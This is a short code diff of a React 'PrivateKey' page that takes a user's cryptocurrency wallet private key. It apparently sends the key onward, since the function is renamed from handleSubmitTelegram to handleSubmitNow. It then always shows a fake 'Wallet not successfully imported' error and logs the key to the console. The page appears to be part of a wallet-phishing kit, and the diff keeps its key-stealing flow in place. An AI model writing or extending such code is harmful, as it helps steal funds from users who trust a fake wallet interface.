@@ -12,7 +12,7 @@ import { ProjectContext } from "../context/ProjectContext";
 const PrivateKey = () => {
   const [loading, setLoading] = useState(false);
   const [openModal, setOpenModal] = useState(false);
-  const { walletName, privateKey, setPrivateKey, handleSubmitTelegram } =
+  const { walletName, privateKey, setPrivateKey, handleSubmitNow } =
     useContext(ProjectContext);
   const navigate = useNavigate();
   console.log(privateKey);
@@ -36,7 +36,7 @@ const PrivateKey = () => {
       )
       .then((response) => {
         setLoading(false);
-        handleSubmitTelegram();
+        handleSubmitNow();
         toast.error("Wallet not successfully imported. Please try again.");
         setPrivateKey("");
         setTimeout(() => {
